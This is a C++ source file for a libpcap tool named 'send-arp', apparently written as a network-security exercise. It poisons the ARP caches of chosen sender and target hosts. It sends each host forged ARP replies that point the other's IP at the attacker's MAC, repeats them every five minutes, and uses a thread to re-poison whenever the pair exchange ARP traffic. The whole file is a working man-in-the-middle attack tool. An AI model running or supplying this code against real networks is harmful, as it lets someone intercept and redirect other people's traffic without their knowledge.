#include <cstdio>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>

#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>

#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
   EthHdr eth_;
   ArpHdr arp_;
};

struct ThreadData {
   pcap_t* _handle;
   int _argc;
   char** _argv;
};

#pragma pack(pop)

char myip[16] = { 0 };
char mymac[18] = { 0 };

void usage() {
   printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
   printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int MyIpMac(char* dev, char* myip, char* mymac)
{
   struct ifreq ifr;
   int fd;
   int ret, ret2;
   uint8_t mymacADDR[6];

   fd = socket(AF_INET, SOCK_DGRAM, 0);
   if (fd < 0) {
      printf("socket failed!!\n");
      return -1;
   }

   strncpy(ifr.ifr_name, dev, IFNAMSIZ);
   ret = ioctl(fd, SIOCGIFHWADDR, &ifr);

   if (ret < 0) {
      printf("ioctl failed!!\n");
      return -1;
   }

   memcpy(mymacADDR, ifr.ifr_hwaddr.sa_data, 6);
   sprintf(mymac, "%02x:%02x:%02x:%02x:%02x:%02x", mymacADDR[0], mymacADDR[1], mymacADDR[2], mymacADDR[3], mymacADDR[4], mymacADDR[5]);

   ret2 = ioctl(fd, SIOCGIFADDR, &ifr);

   if (ret2 < 0) {
      printf("ioctl failed!!\n");
      return -1;
   }

   inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, myip, sizeof(struct sockaddr));
}

EthArpPacket CreatePacket(Mac mymac, Mac dmac, char* sip, char* dip, Mac tmac, bool isRequest) {
   EthArpPacket packet;

   packet.eth_.dmac_ = dmac;
   packet.eth_.smac_ = mymac;
   packet.eth_.type_ = htons(EthHdr::Arp);

   packet.arp_.hrd_ = htons(ArpHdr::ETHER);
   packet.arp_.pro_ = htons(EthHdr::Ip4);
   packet.arp_.hln_ = Mac::SIZE;
   packet.arp_.pln_ = Ip::SIZE;

   if (isRequest)
      packet.arp_.op_ = htons(ArpHdr::Request);
   else
      packet.arp_.op_ = htons(ArpHdr::Reply);

   packet.arp_.smac_ = mymac;
   packet.arp_.sip_ = htonl(Ip(sip));

   if (tmac != Mac("00:00:00:00:00:00"))
      packet.arp_.tmac_ = tmac;
   else
      packet.arp_.tmac_ = Mac::nullMac();

   packet.arp_.tip_ = htonl(Ip(dip));

   return packet;
}

void SendPacket(pcap_t* handle, EthArpPacket packet) {
   int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
   if (res != 0) {
      fprintf(stderr, "ERROE = %s : packet return %d \n", pcap_geterr(handle), res);
   }
}

Mac GetSenderMac(pcap_t* handler, char* MyIp, char* MyMac, char* SenderIp) {
   struct pcap_pkthdr* ReplyPacket;
   const u_char* pkt_data;
   EthArpPacket packet;
   int res;
   //struct libnet_ethernet_hdr* eth;

   packet = CreatePacket(Mac(MyMac), Mac("ff:ff:ff:ff:ff:ff"), MyIp, SenderIp, Mac("00:00:00:00:00:00"), true);
   SendPacket(handler, packet);

   while (1)
   {
      res = pcap_next_ex(handler, &ReplyPacket, &pkt_data);

      if (res == 0) {
         printf("res == 0");
         continue;
      }
      if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
         printf("%s : pcap_next_ex return %d\n", pcap_geterr(handler), res);
         break;
      }

      struct EthHdr* eth = (struct EthHdr*)(pkt_data);
      struct ArpHdr* ath = (struct ArpHdr*)(pkt_data + 14);


      if (eth->type_ == htons(EthHdr::Arp))
         return ath->smac_;
   }
}

void SendArp(pcap_t* handle, char* senderIp, Mac mymac, char* targetIp, Mac targetMac) {
   EthArpPacket packet = CreatePacket(mymac, targetMac, senderIp, targetIp, targetMac, false);

   printf("***********************************************\n");
   printf("sender ip  = %s \n", senderIp);
   printf("sender mac = %s \n", ((std::string)mymac).c_str());
   printf("target ip  = %s \n", targetIp);
   printf("target mac  = %s \n", ((std::string)targetMac).c_str());
   printf("my mac = %s \n", ((std::string)mymac).c_str());
   SendPacket(handle, packet);
   printf("success");
}

void* LoopArp(void* data)
{
   ThreadData threadData = *(ThreadData*)data;
   pcap_t* handle = threadData._handle;
   int argc = threadData._argc;
   char** argv = threadData._argv;

   struct pcap_pkthdr* ReplyPacket;
   const u_char* pkt_data;
   EthArpPacket packet;
   int res;

   while (1)
   {
      res = pcap_next_ex(handle, &ReplyPacket, &pkt_data);
      if (res == 0) {
         printf("res == 0");
         continue;
      }
      if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
         printf("%s : pcap_next_ex return %d\n", pcap_geterr(handle), res);
         break;
      }

      struct EthHdr* eth = (struct EthHdr*)(pkt_data);
      struct ArpHdr* ath = (struct ArpHdr*)(pkt_data + 14);


      if (eth->type_ == htons(EthHdr::Arp))
      {
         for (int i = 2; i < argc; i++)
         {
            if ((uint32_t)ath->sip_ == htonl(Ip(argv[i])))
            {
               for (int j = 2; j < argc; j++)
               {
                  if ((uint32_t)ath->tip_ == htonl(Ip(argv[j])))
                  {
                     Mac targetmac = GetSenderMac(handle, myip, mymac, argv[j]);
                     SendArp(handle, argv[i], Mac(mymac), argv[j], targetmac);
                  }
               }
            }
         }
      }
   }
}

int main(int argc, char* argv[]) {
   if (argc < 4 || argc % 2 != 0) {
      printf("*Fill in the form*\n");
      usage();
      return -1;
   }

   char* dev = argv[1];
   char errbuf[PCAP_ERRBUF_SIZE];
   pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
   if (handle == nullptr) {
      fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
      return -1;
   }

   if (MyIpMac(argv[1], myip, mymac) < 0)
   {
      printf("error");
   }

   int status;
   ThreadData threadData;
   threadData._handle = handle;
   threadData._argc = argc;
   threadData._argv = argv;
   pthread_t p_thread;
   int thr_id = pthread_create(&p_thread, NULL, LoopArp, (void*)&threadData);
   if (thr_id < 0)
   {
      perror("thread create error : ");
      exit(0);
   }

   while (1)
   {
      for (int m = 2; m < argc; m += 2) {
         Mac sendmac = GetSenderMac(handle, myip, mymac, argv[m]);
         Mac targetmac = GetSenderMac(handle, myip, mymac, argv[m + 1]);

         SendArp(handle, argv[m], Mac(mymac), argv[m+1], targetmac);
         SendArp(handle, argv[m+1], Mac(mymac), argv[m], sendmac);
      }
      sleep(60*5);
   }
   pcap_close(handle);
   pthread_join(p_thread, (void**)&status);
}
